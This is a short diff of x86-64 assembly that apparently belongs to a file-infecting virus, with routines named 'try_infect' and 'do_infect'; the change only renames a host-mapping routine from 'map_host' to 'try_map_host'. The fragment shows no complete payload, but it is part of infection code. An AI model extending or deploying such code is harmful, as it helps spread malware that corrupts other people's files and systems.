@@ -292,7 +292,7 @@ try_infect:
 
     mov rdi, rsi
     mov rsi, .close
-    call map_host
+    call try_map_host
     mov data(host_bytes), rax
     mov rdi, rax
 
@@ -397,8 +397,8 @@ do_infect:
         pop r13
         ret
 
-; void *map_host(rdi=len, rsi=callback)
-map_host:
+; void *try_map_host(rdi=len, rsi=callback)
+try_map_host:
     push rsi
     mov rsi, rdi
     xor r9, r9
